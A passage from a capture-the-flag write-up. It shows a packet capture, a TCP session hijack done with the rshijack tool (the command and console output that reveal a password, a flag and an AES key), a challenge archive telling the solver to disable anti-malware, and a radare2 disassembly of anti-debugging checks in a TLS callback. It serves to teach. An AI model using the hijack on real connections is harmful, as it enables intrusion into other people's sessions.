   48 266.089341078 192.168.54.152 → 192.168.54.150 TCP 54 57984 → 39926 [ACK] Seq=63 Ack=151 Win=512 Len=0 57984 39926
   49 272.732277709 192.168.54.152 → 192.168.54.150 TCP 61 57984 → 39926 [PSH, ACK] Seq=63 Ack=151 Win=896 Len=7 57984 39926
   50 272.732753440 192.168.54.150 → 192.168.54.152 TCP 91 39926 → 57984 [PSH, ACK] Seq=151 Ack=70 Win=29056 Len=25 TSval=2886707057 TSecr=3333909706 39926 57984
   51 272.732912549 192.168.54.152 → 192.168.54.150 TCP 54 57984 → 39926 [ACK] Seq=70 Ack=176 Win=512 Len=0 57984 39926
   52 275.949361947 192.168.54.152 → 192.168.54.150 TCP 71 57984 → 39926 [PSH, ACK] Seq=70 Ack=176 Win=2176 Len=17 57984 39926
   53 275.949808104 192.168.54.150 → 192.168.54.152 TCP 91 39926 → 57984 [PSH, ACK] Seq=176 Ack=87 Win=29056 Len=25 TSval=2886710273 TSecr=3333909706 39926 57984
   54 275.949952052 192.168.54.152 → 192.168.54.150 TCP 54 57984 → 39926 [ACK] Seq=87 Ack=201 Win=512 Len=0 57984 39926
   55 281.874257810 192.168.54.152 → 192.168.54.150 TCP 70 57984 → 39926 [PSH, ACK] Seq=87 Ack=201 Win=2048 Len=16 57984 39926
   56 281.875473920 192.168.54.150 → 192.168.54.152 TCP 68 39926 → 57984 [PSH, ACK] Seq=201 Ack=103 Win=29056 Len=2 TSval=2886716195 TSecr=3333909706 39926 57984
   57 281.875965189 192.168.54.152 → 192.168.54.150 TCP 54 57984 → 39926 [ACK] Seq=103 Ack=203 Win=512 Len=0 57984 39926
   58 287.011017897 192.168.54.152 → 192.168.54.150 TCP 61 57984 → 39926 [PSH, ACK] Seq=103 Ack=203 Win=896 Len=7 57984 39926
   59 287.011482773 192.168.54.150 → 192.168.54.152 TCP 89 39926 → 57984 [PSH, ACK] Seq=203 Ack=110 Win=29056 Len=23 TSval=2886721329 TSecr=3333909706 39926 57984
   60 287.011631906 192.168.54.152 → 192.168.54.150 TCP 54 57984 → 39926 [ACK] Seq=110 Ack=226 Win=512 Len=0 57984 39926
   61 289.507993227 192.168.54.152 → 192.168.54.150 TCP 57 57984 → 39926 [PSH, ACK] Seq=110 Ack=226 Win=384 Len=3 57984 39926
   62 289.508520672 192.168.54.150 → 192.168.54.152 TCP 140 39926 → 57984 [PSH, ACK] Seq=226 Ack=113 Win=29056 Len=74 TSval=2886723825 TSecr=3333909706 39926 57984
   63 289.508670804 192.168.54.152 → 192.168.54.150 TCP 54 57984 → 39926 [ACK] Seq=113 Ack=300 Win=512 Len=0 57984 39926
   64 291.749411741 192.168.54.152 → 192.168.54.150 TCP 59 57984 → 39926 [PSH, ACK] Seq=113 Ack=300 Win=640 Len=5 57984 39926
   65 291.749876905 192.168.54.150 → 192.168.54.152 TCP 91 39926 → 57984 [PSH, ACK] Seq=300 Ack=118 Win=29056 Len=25 TSval=2886726065 TSecr=3333909706 39926 57984
   66 291.750020677 192.168.54.152 → 192.168.54.150 TCP 54 57984 → 39926 [ACK] Seq=118 Ack=325 Win=512 Len=0 57984 39926
   67 292.064874584 PcsCompu_17:82:1b → PcsCompu_14:69:d5 ARP 42 Who has 192.168.54.150? Tell 192.168.54.151
   68 292.065925686 PcsCompu_14:69:d5 → PcsCompu_17:82:1b ARP 60 192.168.54.150 is at 08:00:27:14:69:d5
   69 295.383209517 192.168.54.152 → 192.168.54.150 TCP 63 57984 → 39926 [PSH, ACK] Seq=118 Ack=325 Win=1152 Len=9 57984 39926
   70 295.383862265 192.168.54.150 → 192.168.54.152 TCP 90 39926 → 57984 [PSH, ACK] Seq=325 Ack=127 Win=29056 Len=24 TSval=2886729697 TSecr=3333909706 39926 57984
   71 295.384054571 192.168.54.152 → 192.168.54.150 TCP 54 57984 → 39926 [ACK] Seq=127 Ack=349 Win=512 Len=0 57984 39926
   72 299.128980064 192.168.54.152 → 192.168.54.150 TCP 62 57984 → 39926 [PSH, ACK] Seq=127 Ack=349 Win=1024 Len=8 57984 39926
   73 299.129457612 192.168.54.150 → 192.168.54.152 TCP 120 39926 → 57984 [PSH, ACK] Seq=349 Ack=135 Win=29056 Len=54 TSval=2886733441 TSecr=3333909706 39926 57984
   74 299.130427192 192.168.54.152 → 192.168.54.150 TCP 54 57984 → 39926 [ACK] Seq=135 Ack=403 Win=512 Len=0 57984 39926
   75 302.442721723 192.168.54.152 → 192.168.54.150 TCP 59 57984 → 39926 [PSH, ACK] Seq=135 Ack=403 Win=640 Len=5 57984 39926
   76 302.443180559 192.168.54.150 → 192.168.54.152 TCP 117 39926 → 57984 [PSH, ACK] Seq=403 Ack=140 Win=29056 Len=51 TSval=2886736753 TSecr=3333909706 39926 57984
   77 302.443325328 192.168.54.152 → 192.168.54.150 TCP 54 57984 → 39926 [ACK] Seq=140 Ack=454 Win=512 Len=0 57984 39926
```
Packets 1-36 are the real client communicating with the server. Starting from packet #37, the session is hijacked and we are communicating with the server via the `rshijack` console (notice how the IP stays the same even though this is a different VM):
```console
# ./rshijack eth2 192.168.54.152:57984 192.168.54.150:39926
Waiting for SEQ/ACK to arrive from the srcip to the dstip.
(To speed things up, try making some traffic between the two, /msg person asdf)
DEBUG 2019-02-19T20:04:01Z: rshijack::net: eth: EthernetFrame { source_mac: MacAddress([8, 0, 39, 244, 81, 250]), dest_mac: MacAddress([8, 0, 39, 20, 105, 213]), ethertype: IPv4 }
DEBUG 2019-02-19T20:04:01Z: rshijack::net: ip4: IPv4Header { version: 4, ihl: 20, tos: 0, length: 60, id: 5104, flags: 2, fragment_offset: 0, ttl: 64, protocol: TCP, chksum: 14413, source_addr: 192.168.54.152, dest_addr: 192.168.54.150 }
DEBUG 2019-02-19T20:04:01Z: rshijack::net: tcp: TcpHeader { source_port: 57984, dest_port: 39926, sequence_no: 4024149525, ack_no: 994209791, data_offset: 8, reserved: 0, flag_urg: false, flag_ack: true, flag_psh: true, flag_rst: false, flag_syn: false, flag_fin: false, window: 229, checksum: 47701, urgent_pointer: 0, options: None }
[+] Got packet! SEQ = 0xefdba61d, ACK = 0x3b426fff
Starting hijack session, Please use ^D to terminate.
Anything you enter from now on is sent to the hijacked TCP connection.
test
wrong password, try again
laeyobmsamlrdmyh
ok
whoami
LUKE, I am your father!
ls
420240    canudoit.zip
4096      Downloads
4096      Home
4096      Publictime
It's time to say GOODBYE!
get flag
your flag is: 4******
get key
AES
key=4dJhvjFRn2oXraty
iv=1234567890123456
MODE_CBC
help
I really want to help you, but I hate get COMMANDS!
```
The `ls` command reveals the existence of `canudoit.zip`. We can download this file by creating a script that connects to the server on port 11111, receives the 16-byte buffer, decrypts it using the crypto details provided by `get key`, sends a `downloadfile canudoit.zip` command and reads the response into a file. Since we already have the file from the easy solution, we'll skip that.
On we go, to the next level. 
```console
root@kali:~/CTFs/433# unzip canudoit.zip
Archive:  canudoit.zip
  inflating: instructions.txt
  inflating: run.exe
root@kali:~/CTFs/433# cat instructions.txt
Disable any anti-malware software on your computer and run the application!!
If you are tired at this point - send your cv to:
PI:EMAIL
dont forget to add the flag number (use'get flag')
root@kali:~/CTFs/433# file run.exe
run.exe: PE32 executable (console) Intel 80386, for MS Windows
```
So we have a request to disable any anti-malware software on the computer (always nice to hear), and a Windows executable. As always, we'll be running in a virtual machine.
Running the application produces the following error message:
![](images/run.png)
At first, I thought that this is some protection against running in virtual machines. However, I couldn't find any in the assembly. Back to Yaakov, then. Most of the credit goes to him for this reversing stage, I just followed his steps. Thanks to [Dor](https://binary4fun.wordpress.com/) too for his helpful hints!
In order to disassemble the program, I worked with IDA, however the snippets below will be taken from Radare2 since it's possible to copy text from there.
The first things that jumps to the eye when reviewing the list of functions is the existence of a TLS callback. TLS Callbacks are traditionally used to initialize  thread-specific data before a thread runs, and are therefore called before the entry point of the program. In other words, they can execute before the debugger breaks on the entry point. So, in order to make it harder to find anti-debugging checks, these anti-debugging checks are sometimes placed in the TLS Callback.
```
                                                                       .----------------------------------------.
                                                                       | [0x4022d0]                             |
                                                                       | (fcn) entry1 192                       |
                                                                       |   entry1 (int arg_ch);                 |
                                                                       | ; var unsigned int local_ch @ ebp-0xc  |
                                                                       | ; var unsigned int local_8h @ ebp-0x8  |
                                                                       | ; var int local_4h @ ebp-0x4           |
                                                                       | ; arg int arg_ch @ ebp+0xc             |
                                                                       | push ebp                               |
                                                                       | mov ebp, esp                           |
                                                                       | sub esp, 0xc                           |
                                                                       | ; [0x43c06c:4]=0xbb40e64e              |
                                                                       | mov eax, dword [0x43c06c]              |
                                                                       | xor eax, ebp                           |
                                                                       | mov dword [local_4h], eax              |
                                                                       | sub dword [arg_ch], 1                  |
                                                                       | jne 0x402380;[ga]                      |
                                                                       `----------------------------------------'
                                                                               f t
                                                                               | |
                                                                               | '--------------------------------.
                                       .---------------------------------------'                                  |
                                       |                                                                          |
                                   .----------------------------------------------------------------------.       |
                                   |  0x4022ea [gf]                                                       |       |
                                   | lea eax, [local_8h]                                                  |       |
                                   | push eax                                                             |       |
                                   | ; 0x42a0bc                                                           |       |
                                   | ; "\"\xb6\x03"                                                       |       |
                                   | call dword [sym.imp.KERNEL32.dll_GetCurrentProcess];[gc]             |       |
                                   | push eax                                                             |       |
                                   | ; 0x42a0c4                                                           |       |
                                   | call dword [sym.imp.KERNEL32.dll_CheckRemoteDebuggerPresent];[gd]    |       |
                                   | test eax, eax                                                        |       |
                                   | je 0x40237b;[ge]                                                     |       |
                                   `----------------------------------------------------------------------'       |
                                           f t                                                                    |
                                           | |                                                                    |
                                           | '------------------------------.                                     |
                                        .--'                                |                                     |
                                        |                                   |                                     |
                                    .-------------------------------.   .------------------------------------.    |
                                    |  0x4022ff [gh]                |   |  0x40237b [ge]                     |    |
                                    | cmp dword [local_8h], 0       |   | ; CODE XREF from entry1 (0x4022fd) |    |
                                    | je 0x40230a;[gg]              |   | call fcn.00402e00;[gi]             |    |
                                    `-------------------------------'   `------------------------------------'    |       
                                            f t                             v                                     |
                                            | |                             |                                     |
                                            | '-----------------------------|--------------.                      |
                                          .-'                               |              |                      |
                                          |                                 '------------------------.            |
                                          |                                                |         | .----------'
                                          |                                                |         | |
                                      .--------------------------.                         |   .------------------------------------.
                                      |  0x402305 [gj]           |                         |   |  0x402380 [ga]                     |
                                      | call fcn.00402e00;[gi]   |                         |   | ; CODE XREF from entry1 (0x4022e4) |
                                      `--------------------------'                         |   | mov ecx, dword [local_4h]          |
                                          v                                                |   | xor ecx, ebp                       |
                                          |                                                |   | call fcn.0040c5e7;[gx]             |
                                          |                                                |   | mov esp, ebp                       |
                                          |                                                |   | pop ebp                            |
                                          |                                                |   | ret 0xc                            |
                                          |                                                |   `------------------------------------'
                                          |                                                |
                                          |                                                |
                                          '-------------------.                            |
                                                              | .--------------------------'
                                                              | |
                                                        .--------------------------------------------------------.
                                                        |  0x40230a [gg]                                         |
                                                        | ; 0x437520                                             |
                                                        | ; u"CyMutex"                                           |
                                                        | push str.CyMutex                                       |
                                                        | push 0                                                 |
                                                        | push 0                                                 |
                                                        | ; 0x42a0b8                                             |
                                                        | ; "6\xb6\x03"                                          |
                                                        | call dword [sym.imp.KERNEL32.dll_CreateMutexW];[gk]    |
                                                        | ; 0x42a0b4                                             |
                                                        | ; "F\xb6\x03"                                          |
                                                        | call dword [sym.imp.KERNEL32.dll_GetLastError];[gl]    |
                                                        | ; 183                                                  |
                                                        | cmp eax, 0xb7                                          |
                                                        | jne 0x40232b;[gm]                                      |
                                                        `--------------------------------------------------------'
                                                                f t
                                                                | |
                                                                | '------------------------------------.
                                                          .-----'                                      |
                                                          |                                            |
                                                      .--------------------------.                     |
                                                      |  0x402326 [gn]           |                     |
                                                      | call fcn.00402e00;[gi]   |                     |
                                                      `--------------------------'                     |
                                                          v                                            |
                                                          |                                            |
                                                       .--'                                            |
                                                       | .---------------------------------------------'